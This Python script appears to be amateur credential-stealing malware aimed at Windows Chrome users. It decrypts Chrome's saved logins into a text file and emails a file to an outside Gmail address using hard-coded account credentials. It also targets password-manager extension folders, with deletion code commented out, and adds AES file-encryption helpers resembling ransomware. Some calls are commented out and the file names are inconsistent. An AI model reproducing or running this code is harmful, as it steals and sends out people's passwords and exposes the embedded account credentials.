import os
import threading
from shutil import copyfile

from Crypto import Random
from Crypto.Cipher import AES


def test():
    print("testy test")


t = threading.Thread(target=test(), daemon=True)
t.start()
# do stuff
t.join()

destination = "output.txt"

env = os.getenv("LOCALAPPDATA")
path_lastpass = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\hdokiejnpimakedhajhdlcegeplioahd"  # lastpass
path_keeper = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\bfogiafebfohielmmehodmfbbebbbpei"  # keeper
path_dasklane = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\fdjamakpfbbddfjaooikfcpapjohcfmg"  # dashlane
path_roboform = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\pnlccmojcmeohlpggmfnbbiapkmbliob"  # roboform

try:
    pass
    # shutil.rmtree("")# path_lastpass
    # shutil.rmtree(path_keeper)
    # shutil.rmtree(path_dasklane)
    # shutil.rmtree(path_roboform)
except:
    pass


# path_all = env+ "\\Google\\Chrome\\User Data\\Default\\Extensions

def getpass():
    from sqlite3 import connect
    import win32crypt

    path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"
    path = path.strip()
    path2 = path2.strip()
    # path = ""
    # print(path)
    # print(path2)

    try:
        copyfile(path, path2)
    except:
        pass
    conn = connect(path2)
    cursor = conn.cursor()
    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    if os.path.exists(destination):
        os.remove(destination)
    sites = []
    for raw in cursor.fetchall():
        # print(raw)
        ## raw[0] = url
        ## raw[1] = login
        ## raw[2] = binary
        try:
            if raw[0] not in sites:
                # print(format(win32crypt.CryptUnprotectData(raw[2])[1]))
                if os.path.exists(destination):
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                else:
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                sites.append(raw[0])
        except:
            continue
    conn.close()
    return 0


def sendEmail():
    import smtplib
    import os.path as op
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email.mime.text import MIMEText
    from email.utils import formatdate
    from email import encoders

    FROM = "alykhidr604@gmail.com"
    PASSWORD = "Starbucks@2018"

    TO = "alik9807274@gmail.com"
    SUBJECT = "data for myMalware.py"

    MESSAGE = """\

    here is text.txt :) 

    """

    # https://stackoverflow.com/questions/3362600/how-to-send-email-attachments
    msg = MIMEMultipart()
    msg['From'] = FROM
    msg['To'] = TO
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = SUBJECT
    msg.attach(MIMEText(MESSAGE))

    part = MIMEBase('application', "octet-stream")
    with open('text.txt', 'rb') as file:
        part.set_payload(file.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    'attachment; filename="{}"'.format(op.basename('text.txt')))  # name(s) of attachment(s)
    msg.attach(part)

    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login(FROM, PASSWORD)
    smtp.sendmail(FROM, TO, msg.as_string())
    smtp.quit()

    print('successfully sent the mail')

    #
    # try:
    #     server_ssl = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    #     server_ssl.ehlo()  # optional, called by login()
    #     server_ssl.login(FROM, password)
    #     # ssl server doesn't support or need tls, so don't call server_ssl.starttls()
    #     server_ssl.sendmail(FROM, TO, message)
    #     server_ssl.quit()
    #     server_ssl.close()
    #     print('successfully sent the mail')
    # except:
    #     print("failed to send mail")


def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")


def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".enc", 'wb') as fo:
        fo.write(enc)


def decrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)


# getpass()

# sendEmail()

# key = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'
key = os.urandom(32)

encrypt_file('to_enc.txt', key)
decrypt_file('to_enc.txt.enc', key)
